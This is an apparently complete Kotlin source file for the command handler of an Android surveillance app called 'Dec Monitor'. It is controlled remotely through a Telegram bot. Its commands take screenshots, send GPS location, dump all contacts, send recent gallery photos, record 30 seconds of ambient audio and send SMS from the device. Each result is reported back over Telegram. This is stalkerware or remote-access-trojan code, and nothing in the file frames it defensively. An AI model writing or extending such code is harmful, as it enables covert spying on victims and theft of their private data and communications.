package com.dec.monitor

import android.content.Context
import android.content.Intent
import com.dec.monitor.media.AmbientRecorder
import com.dec.monitor.media.GalleryDumper
import com.dec.monitor.system.DeviceInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CommandHandler {

    fun handle(context: Context, command: String) {
        CoroutineScope(Dispatchers.IO).launch {
            when {
                command == "/screenshot" -> {
                    TelegramBot.sendMessage("📸 Taking screenshot...")
                    // triggers via broadcast to ScreenshotService
                    val intent = Intent("com.dec.monitor.TAKE_SCREENSHOT")
                    context.sendBroadcast(intent)
                }
                command == "/location" -> {
                    TelegramBot.sendMessage("📍 Fetching location...")
                    DeviceInfo.getLocation(context)
                }
                command == "/battery" -> {
                    val info = DeviceInfo.getBatteryInfo(context)
                    TelegramBot.sendMessage("🔋 <b>Battery</b>\n$info")
                }
                command == "/contacts" -> {
                    TelegramBot.sendMessage("📒 Fetching contacts...")
                    DeviceInfo.getContacts(context)
                }
                command == "/apps" -> {
                    val apps = DeviceInfo.getInstalledApps(context)
                    TelegramBot.sendMessage("📱 <b>Installed Apps</b>\n$apps")
                }
                command == "/ring" -> {
                    DeviceInfo.ringDevice(context)
                    TelegramBot.sendMessage("🔔 Ringing device...")
                }
                command == "/gallery" -> {
                    TelegramBot.sendMessage("🖼 Sending latest photos...")
                    GalleryDumper.sendLatest(context, 5)
                }
                command == "/mic" -> {
                    TelegramBot.sendMessage("🎙 Recording ambient audio for 30s...")
                    AmbientRecorder.record(context, 30)
                }
                command.startsWith("/sms ") -> {
                    val parts = command.removePrefix("/sms ").split(" ", limit = 2)
                    if (parts.size == 2) {
                        DeviceInfo.sendSms(context, parts[0], parts[1])
                        TelegramBot.sendMessage("✅ SMS sent to ${parts[0]}")
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /sms <number> <message>")
                    }
                }
                command == "/help" -> {
                    TelegramBot.sendMessage(
                        """
🤖 <b>Dec Monitor Commands</b>

/screenshot — take screenshot now
/location — get GPS location
/battery — battery status
/contacts — dump all contacts
/apps — list installed apps
/ring — ring the device
/gallery — send last 5 photos
/mic — record 30s ambient audio
/sms &lt;number&gt; &lt;message&gt; — send SMS
/help — show this menu
                        """.trimIndent()
                    )
                }
                else -> {
                    TelegramBot.sendMessage("❓ Unknown command. Send /help for list.")
                }
            }
        }
    }
}
